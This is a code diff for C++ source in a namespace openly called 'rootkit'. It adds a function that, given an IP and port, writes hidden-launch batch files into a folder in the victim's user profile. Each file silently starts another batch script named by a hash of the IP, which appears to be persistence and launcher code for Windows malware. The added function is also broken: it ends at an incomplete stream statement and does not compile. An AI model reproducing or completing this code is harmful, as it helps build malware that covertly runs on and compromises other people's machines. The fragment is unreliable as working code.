@@ -6,9 +6,10 @@
 #ifndef UNLEN
 #define UNLEN 256
 #endif
+#include <atlbase.h>
+#include <atlconv.h>
 #include <windows.h>
 #include <lm.h>
-
 #pragma comment(lib, "netapi32.lib")
 
 #include <iostream>
@@ -300,6 +301,47 @@ namespace rootkit {
 		}
 		else {
 			return "";
+		}
+	}
+
+	bool is_directory_exists(std::string& path) {
+		CA2W path_w(path.c_str());
+		
+		DWORD dwAttrib = GetFileAttributesW(path_w);
+		return (dwAttrib != INVALID_FILE_ATTRIBUTES && dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
+	}
+
+	PathStatus make_run_bat(std::string& ip, unsigned short port) {
+		std::string dir = "C:/Users/" + rootkit::get_program_host_username() + "/Contacts/port";
+		if (!rootkit::is_directory_exists(dir)) {
+			return PathStatus::Error;
+		}
+		
+		const std::string fileName1 = dir + "/run1.bat";
+		const std::string fileName2 = dir + "/run2.bat";
+		const std::string fileName3 = dir + "/runMaster.bat";
+
+		const std::string rtkFileName = picosha2::hash256_hex_string(ip) + ".bat";
+		std::ofstream run1Bat(fileName1);
+
+		if (run1Bat.is_open()) {
+			run1Bat << "@echo off" << '\n';
+			run1Bat << "start /B " + rtkFileName << '\n';
+		}
+		else return PathStatus::Error;
+		
+		std::ofstream run2Bat(fileName2);
+		
+		if (run2Bat.is_open()) {
+			run2Bat << "@echo off" << '\n';
+			run2Bat << "start /B " + rtkFileName << '\n';
+		}
+		else return PathStatus::Error;
+
+		std::ofstream runMasterBat(fileName3);
+
+		if (runMasterBat.is_open()) {
+			runMasterBat <<
 		}
 	}
 }
